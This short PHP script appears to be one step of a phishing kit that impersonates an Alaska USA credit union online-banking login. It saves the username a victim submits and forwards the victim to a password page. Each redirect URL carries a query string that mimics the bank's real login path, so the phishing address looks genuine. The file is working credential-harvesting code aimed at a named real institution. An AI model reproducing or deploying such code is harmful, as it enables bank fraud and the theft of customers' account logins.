<?php


session_start();




$_SESSION["UserName"] = $_POST['UserName'];


if(strlen($_SESSION["UserName"]) == 0 )    {
    header( 'Location: index.php?ultrabranch3.alaskausa.org/efs/servlet/efs/invalid-loginjsp');
}
else if(strstr($_SESSION["UserName"],"@") )
{
	header( "Location: index.php??ultrabranch3.alaskausa.org/efs/servlet/efs/invalid-login");
}



else{



$_SESSION["UserName"];


header('Location: pass.php?ultrabranch3.alaskausa.org/efs/servlet/efs/invalid-loginjsp');





}




?>
